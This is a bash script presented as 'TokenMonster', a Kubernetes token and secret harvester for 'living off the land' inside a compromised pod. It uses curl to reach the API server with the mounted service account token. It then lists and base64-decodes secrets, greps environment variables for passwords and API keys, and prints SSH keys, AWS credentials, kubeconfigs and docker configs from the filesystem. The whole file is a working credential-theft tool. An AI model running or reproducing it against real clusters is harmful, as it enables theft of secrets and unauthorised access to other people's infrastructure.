#!/bin/bash
# TokenMonster - LOTL Edition
# Curl-only implementation for kubectl-less Kubernetes API operations
# Emulates full kubectl functionality using native bash + curl
# Auto-detects and installs missing dependencies

# =============================================================================
# CONFIGURATION & GLOBALS
# =============================================================================

declare -g K8S_API_SERVER="${K8S_API_SERVER:-https://kubernetes.default.svc.cluster.local}"
declare -g K8S_TOKEN=""
declare -g K8S_NAMESPACE="default"
declare -g K8S_CA_CERT="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
declare -g CURL_OPTS="-s"
declare -g INSECURE_MODE=false

# =============================================================================
# DEPENDENCY MANAGEMENT
# =============================================================================

detect_package_manager() {
    if command -v apt-get &> /dev/null; then
        echo "apt-get"
    elif command -v yum &> /dev/null; then
        echo "yum"
    elif command -v apk &> /dev/null; then
        echo "apk"
    elif command -v brew &> /dev/null; then
        echo "brew"
    else
        echo "unknown"
    fi
}

install_kubectl() {
    echo "[*] Attempting to install kubectl..."
    
    local pkg_manager=$(detect_package_manager)
    
    case "$pkg_manager" in
        apt-get)
            echo "[*] Using apt-get to install kubectl"
            sudo apt-get update &>/dev/null
            sudo apt-get install -y kubectl &>/dev/null
            ;;
        yum)
            echo "[*] Using yum to install kubectl"
            sudo yum install -y kubectl &>/dev/null
            ;;
        apk)
            echo "[*] Using apk to install kubectl"
            sudo apk add --no-cache kubectl &>/dev/null
            ;;
        brew)
            echo "[*] Using brew to install kubectl"
            brew install kubectl &>/dev/null
            ;;
        *)
            echo "[!] Unknown package manager - cannot install kubectl"
            return 1
            ;;
    esac
    
    # Verify installation
    if command -v kubectl &> /dev/null; then
        echo "[+] kubectl installed successfully"
        return 0
    else
        echo "[!] Failed to install kubectl"
        return 1
    fi
}

install_curl() {
    echo "[*] Attempting to install curl..."
    
    local pkg_manager=$(detect_package_manager)
    
    case "$pkg_manager" in
        apt-get)
            echo "[*] Using apt-get to install curl"
            sudo apt-get update &>/dev/null
            sudo apt-get install -y curl &>/dev/null
            ;;
        yum)
            echo "[*] Using yum to install curl"
            sudo yum install -y curl &>/dev/null
            ;;
        apk)
            echo "[*] Using apk to install curl"
            sudo apk add --no-cache curl &>/dev/null
            ;;
        brew)
            echo "[*] Using brew to install curl"
            brew install curl &>/dev/null
            ;;
        *)
            echo "[!] Unknown package manager - cannot install curl"
            return 1
            ;;
    esac
    
    # Verify installation
    if command -v curl &> /dev/null; then
        echo "[+] curl installed successfully"
        return 0
    else
        echo "[!] Failed to install curl"
        return 1
    fi
}

# =============================================================================
# CORE DETECTION & INITIALIZATION
# =============================================================================

detect_environment() {
    echo "[*] Detecting Kubernetes environment..."
    
    # Check if kubectl is available
    if command -v kubectl &> /dev/null; then
        echo "[+] kubectl is available - native mode enabled"
        return 0
    else
        echo "[!] kubectl NOT found"
        
        # Try to install kubectl
        if install_kubectl; then
            echo "[+] kubectl installed - native mode enabled"
            return 0
        else
            echo "[!] Cannot install kubectl - falling back to curl-based LOTL mode"
        fi
    fi
    
    # Verify curl is available
    if ! command -v curl &> /dev/null; then
        echo "[!] curl not found - attempting installation"
        if ! install_curl; then
            echo "[!] FATAL: curl is required but cannot be installed"
            return 2
        fi
    fi
    
    echo "[+] curl is available"
    
    # Initialize LOTL environment
    if [ -f "$K8S_CA_CERT" ]; then
        echo "[+] Found CA certificate at $K8S_CA_CERT"
    else
        echo "[!] CA certificate not found - using insecure mode"
        INSECURE_MODE=true
        CURL_OPTS="-s -k"
    fi
    
    # Try to find service account token
    if [ -f "/var/run/secrets/kubernetes.io/serviceaccount/token" ]; then
        K8S_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
        echo "[+] Found mounted service account token"
    fi
    
    # Try to find namespace
    if [ -f "/var/run/secrets/kubernetes.io/serviceaccount/namespace" ]; then
        K8S_NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)
        echo "[+] Current namespace: $K8S_NAMESPACE"
    fi
    
    return 1
}

# =============================================================================
# BASE64 DECODING (Pure Bash Compatible)
# =============================================================================

decode_base64() {
    local encoded="$1"
    echo "$encoded" | base64 -d 2>/dev/null || {
        echo "[!] Failed to decode base64"
        return 1
    }
}

encode_base64() {
    local plaintext="$1"
    echo -n "$plaintext" | base64 -w 0
}

# =============================================================================
# JSON PARSING (Pure Bash)
# =============================================================================

# Simple JSON field extractor using grep and sed
json_get() {
    local json="$1"
    local field="$2"
    echo "$json" | grep -o "\"$field\"[[:space:]]*:[^,}]*" | cut -d':' -f2- | sed 's/^[[:space:]]*\"//' | sed 's/\"[[:space:]]*$//'
}

# Extract array of items from JSON list
json_array_items() {
    local json="$1"
    # Simple extraction of items from .items array
    echo "$json" | grep -o '{"[^}]*":[^}]*}' || echo "$json"
}

# =============================================================================
# KUBERNETES API OPERATIONS (Curl-Based)
# =============================================================================

k8s_api_get() {
    local endpoint="$1"
    local token="${2:-$K8S_TOKEN}"
    local namespace="${3:-$K8S_NAMESPACE}"
    
    local url="$K8S_API_SERVER/api/v1/$endpoint"
    
    if [ -f "$K8S_CA_CERT" ] && [ "$INSECURE_MODE" = false ]; then
        curl $CURL_OPTS \
            -H "Authorization: Bearer $token" \
            -H "Content-Type: application/json" \
            --cacert "$K8S_CA_CERT" \
            "$url" 2>/dev/null
    else
        curl $CURL_OPTS -k \
            -H "Authorization: Bearer $token" \
            -H "Content-Type: application/json" \
            "$url" 2>/dev/null
    fi
}

k8s_api_list_namespaced() {
    local resource="$1"
    local namespace="$2"
    local token="${3:-$K8S_TOKEN}"
    
    k8s_api_get "namespaces/$namespace/$resource" "$token" "$namespace"
}

k8s_api_list_cluster() {
    local resource="$1"
    local token="${2:-$K8S_TOKEN}"
    
    k8s_api_get "$resource" "$token"
}

k8s_api_get_resource() {
    local resource="$1"
    local name="$2"
    local namespace="${3:-$K8S_NAMESPACE}"
    local token="${4:-$K8S_TOKEN}"
    
    k8s_api_get "namespaces/$namespace/$resource/$name" "$token" "$namespace"
}

k8s_api_create() {
    local resource="$1"
    local namespace="$2"
    local data="$3"
    local token="${4:-$K8S_TOKEN}"
    
    local url="$K8S_API_SERVER/api/v1/namespaces/$namespace/$resource"
    
    if [ -f "$K8S_CA_CERT" ] && [ "$INSECURE_MODE" = false ]; then
        curl $CURL_OPTS -X POST \
            -H "Authorization: Bearer $token" \
            -H "Content-Type: application/json" \
            --cacert "$K8S_CA_CERT" \
            -d "$data" \
            "$url" 2>/dev/null
    else
        curl $CURL_OPTS -k -X POST \
            -H "Authorization: Bearer $token" \
            -H "Content-Type: application/json" \
            -d "$data" \
            "$url" 2>/dev/null
    fi
}

k8s_api_delete() {
    local resource="$1"
    local name="$2"
    local namespace="${3:-$K8S_NAMESPACE}"
    local token="${4:-$K8S_TOKEN}"
    
    local url="$K8S_API_SERVER/api/v1/namespaces/$namespace/$resource/$name"
    
    if [ -f "$K8S_CA_CERT" ] && [ "$INSECURE_MODE" = false ]; then
        curl $CURL_OPTS -X DELETE \
            -H "Authorization: Bearer $token" \
            -H "Content-Type: application/json" \
            --cacert "$K8S_CA_CERT" \
            "$url" 2>/dev/null
    else
        curl $CURL_OPTS -k -X DELETE \
            -H "Authorization: Bearer $token" \
            -H "Content-Type: application/json" \
            "$url" 2>/dev/null
    fi
}

k8s_api_patch() {
    local resource="$1"
    local name="$2"
    local data="$3"
    local namespace="${4:-$K8S_NAMESPACE}"
    local token="${5:-$K8S_TOKEN}"
    
    local url="$K8S_API_SERVER/api/v1/namespaces/$namespace/$resource/$name"
    
    if [ -f "$K8S_CA_CERT" ] && [ "$INSECURE_MODE" = false ]; then
        curl $CURL_OPTS -X PATCH \
            -H "Authorization: Bearer $token" \
            -H "Content-Type: application/strategic-merge-patch+json" \
            --cacert "$K8S_CA_CERT" \
            -d "$data" \
            "$url" 2>/dev/null
    else
        curl $CURL_OPTS -k -X PATCH \
            -H "Authorization: Bearer $token" \
            -H "Content-Type: application/strategic-merge-patch+json" \
            -d "$data" \
            "$url" 2>/dev/null
    fi
}

# =============================================================================
# KUBECTL EMULATION - GET OPERATIONS
# =============================================================================

k8s_get_pods() {
    local namespace="${1:-$K8S_NAMESPACE}"
    local token="${2:-$K8S_TOKEN}"
    
    echo "[*] Fetching pods from namespace: $namespace"
    local response=$(k8s_api_list_namespaced "pods" "$namespace" "$token")
    
    # Extract pod names and statuses
    echo "$response" | grep -o '\"name\":\"[^\"]*\"' | cut -d'\"' -f4 | while read -r pod_name; do
        local status=$(echo "$response" | grep -A20 "\"name\":\"$pod_name\"" | grep -o '\"phase\":\"[^\"]*\"' | cut -d'\"' -f4 | head -1)
        echo "  $pod_name ($status)"
    done
}

k8s_get_secrets() {
    local namespace="${1:-$K8S_NAMESPACE}"
    local token="${2:-$K8S_TOKEN}"
    
    echo "[*] Fetching secrets from namespace: $namespace"
    local response=$(k8s_api_list_namespaced "secrets" "$namespace" "$token")
    
    echo "$response" | grep -o '\"name\":\"[^\"]*\"' | cut -d'\"' -f4 | while read -r secret_name; do
        echo "  $secret_name"
    done
}

k8s_get_configmaps() {
    local namespace="${1:-$K8S_NAMESPACE}"
    local token="${2:-$K8S_TOKEN}"
    
    echo "[*] Fetching ConfigMaps from namespace: $namespace"
    local response=$(k8s_api_list_namespaced "configmaps" "$namespace" "$token")
    
    echo "$response" | grep -o '\"name\":\"[^\"]*\"' | cut -d'\"' -f4 | while read -r cm_name; do
        echo "  $cm_name"
    done
}

k8s_get_serviceaccounts() {
    local namespace="${1:-$K8S_NAMESPACE}"
    local token="${2:-$K8S_TOKEN}"
    
    echo "[*] Fetching service accounts from namespace: $namespace"
    local response=$(k8s_api_list_namespaced "serviceaccounts" "$namespace" "$token")
    
    echo "$response" | grep -o '\"name\":\"[^\"]*\"' | cut -d'\"' -f4 | while read -r sa_name; do
        echo "  $sa_name"
    done
}

k8s_get_nodes() {
    local token="${1:-$K8S_TOKEN}"
    
    echo "[*] Fetching cluster nodes"
    local response=$(k8s_api_list_cluster "nodes" "$token")
    
    echo "$response" | grep -o '\"name\":\"[^\"]*\"' | cut -d'\"' -f4 | while read -r node_name; do
        echo "  $node_name"
    done
}

k8s_get_namespaces() {
    local token="${1:-$K8S_TOKEN}"
    
    echo "[*] Fetching cluster namespaces"
    local response=$(k8s_api_list_cluster "namespaces" "$token")
    
    echo "$response" | grep -o '\"name\":\"[^\"]*\"' | cut -d'\"' -f4 | while read -r ns_name; do
        echo "  $ns_name"
    done
}

# =============================================================================
# KUBECTL EMULATION - SECRET EXTRACTION
# =============================================================================

k8s_read_secret() {
    local secret_name="$1"
    local namespace="${2:-$K8S_NAMESPACE}"
    local token="${3:-$K8S_TOKEN}"
    
    echo "[*] Fetching secret: $secret_name"
    local response=$(k8s_api_get_resource "secrets" "$secret_name" "$namespace" "$token")
    
    # Extract all data fields
    echo "$response" | grep -o '\"[^\"]*\":\"[A-Za-z0-9+/=]*\"' | while read -r line; do
        local key=$(echo "$line" | cut -d'\"' -f2)
        local value=$(echo "$line" | cut -d'\"' -f4)
        
        # Skip metadata fields, only show data
        if [[ ! "$key" =~ ^(metadata|apiVersion|kind) ]]; then
            echo "[$key]"
            decode_base64 "$value"
            echo ""
        fi
    done
}

k8s_read_configmap() {
    local cm_name="$1"
    local namespace="${2:-$K8S_NAMESPACE}"
    local token="${3:-$K8S_TOKEN}"
    
    echo "[*] Fetching ConfigMap: $cm_name"
    local response=$(k8s_api_get_resource "configmaps" "$cm_name" "$namespace" "$token")
    
    # Extract data field and pretty print
    echo "$response" | grep -A50 '\"data\"' | grep -o '\"[^\"]*\":\"[^\"]*\"' | while read -r line; do
        echo "$line"
    done
}

# =============================================================================
# KUBECTL EMULATION - EXEC SIMULATION
# =============================================================================

k8s_exec_pod() {
    local pod_name="$1"
    local command="$2"
    local namespace="${3:-$K8S_NAMESPACE}"
    local token="${4:-$K8S_TOKEN}"
    
    echo "[*] Attempting to exec into pod: $pod_name"
    echo "[!] Direct exec requires WebSocket upgrade - attempting read of mounted secrets instead"
    
    # Get pod details to find mounted secrets
    local response=$(k8s_api_get_resource "pods" "$pod_name" "$namespace" "$token")
    
    echo "$response" | grep -o '\"mountPath\":\"[^\"]*\"' | cut -d'\"' -f4 | while read -r mount_path; do
        echo "  Mounted volume: $mount_path"
    done
}

# =============================================================================
# KUBECTL EMULATION - RBAC ANALYSIS
# =============================================================================

k8s_get_rolebindings() {
    local namespace="${1:-$K8S_NAMESPACE}"
    local token="${2:-$K8S_TOKEN}"
    
    echo "[*] Fetching RoleBindings from namespace: $namespace"
    local response=$(k8s_api_list_namespaced "rolebindings" "$namespace" "$token")
    
    echo "$response" | grep -o '\"name\":\"[^\"]*\"' | cut -d'\"' -f4 | while read -r binding_name; do
        echo "  $binding_name"
    done
}

k8s_get_clusterrolebindings() {
    local token="${1:-$K8S_TOKEN}"
    
    echo "[*] Fetching ClusterRoleBindings"
    local response=$(k8s_api_list_cluster "clusterrolebindings" "$token")
    
    echo "$response" | grep -o '\"name\":\"[^\"]*\"' | cut -d'\"' -f4 | while read -r binding_name; do
        echo "  $binding_name"
    done
}

k8s_analyze_rbac() {
    local namespace="${1:-$K8S_NAMESPACE}"
    local token="${2:-$K8S_TOKEN}"
    
    echo "========================================="
    echo "🔐 RBAC ANALYSIS"
    echo "========================================="
    echo ""
    
    echo "=== Service Accounts ==="
    k8s_get_serviceaccounts "$namespace" "$token"
    
    echo ""
    echo "=== RoleBindings ==="
    k8s_get_rolebindings "$namespace" "$token"
    
    echo ""
    echo "=== Checking for Dangerous Permissions ==="
    
    # Check for common dangerous permissions in the response
    local bindings=$(k8s_api_list_namespaced "rolebindings" "$namespace" "$token")
    
    if echo "$bindings" | grep -q '\"verbs\".*\"get\"' && echo "$bindings" | grep -q '\"resources\".*\"secrets\"'; then
        echo "  [!] Found RoleBinding allowing 'get' on 'secrets' - potential credential exposure!"
    fi
    
    if echo "$bindings" | grep -q '\"verbs\".*\"*\"'; then
        echo "  [!] Found RoleBinding with wildcard (*) permissions!"
    fi
}

# =============================================================================
# LOTL MODE - TOKEN HARVESTING
# =============================================================================

harvest_tokens_lotl() {
    echo "========================================="
    echo "🔓 LOTL TOKEN HARVESTING MODE"
    echo "========================================="
    echo ""
    
    # Check for mounted service account token (pod runtime)
    local sa_token_path="/var/run/secrets/kubernetes.io/serviceaccount/token"
    local sa_ca_path="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
    local sa_namespace_path="/var/run/secrets/kubernetes.io/serviceaccount/namespace"
    
    if [ -f "$sa_token_path" ]; then
        echo "[+] Found mounted service account token"
        local token=$(cat "$sa_token_path" 2>/dev/null)
        local namespace=$(cat "$sa_namespace_path" 2>/dev/null)
        
        echo ""
        echo "=== MOUNTED SERVICE ACCOUNT TOKEN ==="
        echo "Namespace: $namespace"
        echo "Token Preview: ${token:0:50}..."
        echo ""
        
        # Try to decode JWT
        decode_jwt "$token"
        
        # Query API server for secrets using this token
        echo ""
        echo "=== SECRETS IN NAMESPACE $namespace ==="
        k8s_get_secrets "$namespace" "$token"
        
        echo ""
        echo "=== CONFIGMAPS IN NAMESPACE $namespace ==="
        k8s_get_configmaps "$namespace" "$token"
    fi
    
    # Check for tokens in environment variables
    echo ""
    echo "=== CHECKING ENVIRONMENT FOR TOKENS ==="
    env | grep -iE "token|password|secret|credential|auth|api.?key" | head -20
    
    # Search filesystem for common token locations
    echo ""
    echo "=== SEARCHING FILESYSTEM FOR TOKENS ==="
    find_tokens_in_filesystem
}

decode_jwt() {
    local jwt="$1"
    
    echo "[*] Attempting to decode JWT..."
    
    # Split JWT
    local header=$(echo "$jwt" | cut -d'.' -f1)
    local payload=$(echo "$jwt" | cut -d'.' -f2)
    
    echo "[JWT Header]"
    decode_base64 "$header" 2>/dev/null | head -5
    
    echo "[JWT Payload]"
    decode_base64 "$payload" 2>/dev/null | head -10
}

find_tokens_in_filesystem() {
    local paths=(
        "/root/.kube/config"
        "/root/.aws/credentials"
        "/root/.ssh/id_rsa"
        "/root/.ssh/id_ed25519"
        "/etc/kubernetes/admin.conf"
        "/etc/kubernetes/kubelet.conf"
        "/.dockercfg"
        "/etc/docker/config.json"
        "/app/.env"
        "/app/config.json"
    )
    
    for path in "${paths[@]}"; do
        if [ -f "$path" ] && [ -r "$path" ]; then
            echo "[+] Found: $path"
            head -10 "$path" 2>/dev/null
            echo ""
        fi
    done
}

# =============================================================================
# KUBECTL NATIVE MODE (PASSTHROUGH)
# =============================================================================

run_kubectl_mode() {
    echo "========================================="
    echo "📋 KUBECTL NATIVE MODE"
    echo "========================================="
    echo ""
    
    local clusters=$(kubectl config get-contexts -o name)
    
    for cluster in ${clusters}; do
        echo "Checking cluster: $cluster"
        kubectl config use-context "$cluster"
        
        echo ""
        echo "=== Namespaces ==="
        kubectl get namespaces -o name
        
        echo ""
        echo "=== Service Accounts ==="
        kubectl get serviceaccounts --all-namespaces
        
        echo ""
        echo "=== Secrets (High Risk) ==="
        kubectl get secrets --all-namespaces --sort-by=.metadata.namespace
        
        echo ""
        echo "=== Analyzing RBAC ==="
        kubectl get rolebindings --all-namespaces
        kubectl get clusterrolebindings
        
        echo ""
    done
}

# =============================================================================
# INTERACTIVE MODE
# =============================================================================

interactive_mode() {
    echo "========================================="
    echo "🧌 TokenMonster - Interactive Mode"
    echo "========================================="
    echo ""
    
    while true; do
        echo ""
        echo "Commands:"
        echo "  1) List pods in current namespace"
        echo "  2) List secrets in current namespace"
        echo "  3) List ConfigMaps in current namespace"
        echo "  4) Read secret contents"
        echo "  5) Analyze RBAC"
        echo "  6) List namespaces"
        echo "  7) Switch namespace"
        echo "  8) Harvest LOTL tokens"
        echo "  9) Exit"
        echo ""
        read -p "Select option: " option
        
        case $option in
            1) k8s_get_pods "$K8S_NAMESPACE" "$K8S_TOKEN" ;;
            2) k8s_get_secrets "$K8S_NAMESPACE" "$K8S_TOKEN" ;;
            3) k8s_get_configmaps "$K8S_NAMESPACE" "$K8S_TOKEN" ;;
            4)
                read -p "Enter secret name: " secret_name
                k8s_read_secret "$secret_name" "$K8S_NAMESPACE" "$K8S_TOKEN"
                ;;
            5) k8s_analyze_rbac "$K8S_NAMESPACE" "$K8S_TOKEN" ;;
            6) k8s_get_namespaces "$K8S_TOKEN" ;;
            7)
                read -p "Enter namespace: " namespace
                K8S_NAMESPACE="$namespace"
                echo "[+] Switched to namespace: $K8S_NAMESPACE"
                ;;
            8) harvest_tokens_lotl ;;
            9) echo "Exiting..."; exit 0 ;;
            *) echo "[!] Invalid option" ;;
        esac
    done
}

# =============================================================================
# MAIN EXECUTION
# =============================================================================

main() {
    echo ""
    echo "╔═════════════════════════════════════════════════════════════════╗"
    echo "║          🧌 TokenMonster - RBAC & Token Harvester 🧌          ║"
    echo "║         Auto-Install Edition (kubectl → curl LOTL mode)         ║"
    echo "╚═════════════════════════════════════════════════════════════════╝"
    echo ""
    
    # Detect environment and available tools
    detect_environment
    local env_result=$?
    
    if [ $env_result -eq 2 ]; then
        echo "[!] FATAL: Cannot proceed without curl"
        exit 1
    fi
    
    if [ $env_result -eq 0 ]; then
        # kubectl is available - run native mode
        echo "[+] Running in kubectl native mode"
        run_kubectl_mode
    else
        # kubectl not available - use curl-based LOTL mode
        echo "[+] Running in curl-based LOTL mode"
        
        # Check for command line arguments
        case "${1:-}" in
            harvest)
                harvest_tokens_lotl
                ;;
            list-pods)
                k8s_get_pods "${2:-$K8S_NAMESPACE}" "$K8S_TOKEN"
                ;;
            list-secrets)
                k8s_get_secrets "${2:-$K8S_NAMESPACE}" "$K8S_TOKEN"
                ;;
            read-secret)
                if [ -z "$2" ]; then
                    echo "[!] Usage: $0 read-secret <secret-name> [namespace]"
                    exit 1
                fi
                k8s_read_secret "$2" "${3:-$K8S_NAMESPACE}" "$K8S_TOKEN"
                ;;
            analyze-rbac)
                k8s_analyze_rbac "${2:-$K8S_NAMESPACE}" "$K8S_TOKEN"
                ;;
            interactive)
                interactive_mode
                ;;
            --help|-h)
                echo "Usage: $0 [command] [options]"
                echo ""
                echo "Commands:"
                echo "  harvest              - Harvest tokens from filesystem and environment"
                echo "  list-pods [ns]       - List pods in namespace (default: $K8S_NAMESPACE)"
                echo "  list-secrets [ns]    - List secrets in namespace"
                echo "  read-secret <name>   - Read and decode secret contents"
                echo "  analyze-rbac [ns]    - Analyze RBAC permissions"
                echo "  interactive          - Enter interactive mode"
                echo "  --help               - Show this help message"
                exit 0
                ;;
            *)
                # Default: run interactive mode
                interactive_mode
                ;;
        esac
    fi
}

# Execute main function
main "$@"
